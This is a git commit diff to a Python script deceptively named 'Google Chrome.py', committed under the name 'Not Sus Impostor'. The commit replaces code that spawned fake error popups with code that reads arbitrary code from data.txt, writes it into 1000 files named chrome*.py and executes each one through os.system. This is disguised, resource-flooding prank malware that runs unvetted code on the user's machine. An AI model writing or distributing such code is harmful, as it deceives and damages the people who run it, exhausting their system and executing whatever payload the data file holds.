d661b7ab3a2a11136b64465160cc825576ad4866
Not Sus Impostor <111621644+a-sussy-impostor@users.noreply.github.com>
2023-12-12 16:55:33 +0800

    Update Google Chrome.py

--- Google Chrome.py
+++ Google Chrome.py
@@ -2,23 +2,15 @@ import math
 from os import system
 import tkinter as tk
 
+code = "";
+
+with open("data.txt","r") as e:
+  global code
+  code = e.read()
+
 for x in range(1000):
   with open(f"chrome{x}.py","w") as f:
-    f.write("""
-import math
-from os import system
-import tkinter as tk
-
-root.Tk()
-root.title('An error occurred')
-root.geometry('100x50')
-
-mylabel = tk.Label(root, text='Error', font=('Arial', 18))
-mylabel.pack()
-
-
-root.mainloop()
-""")
+    f.write(code)
     system(f"python chrome{x}.py")
 
 
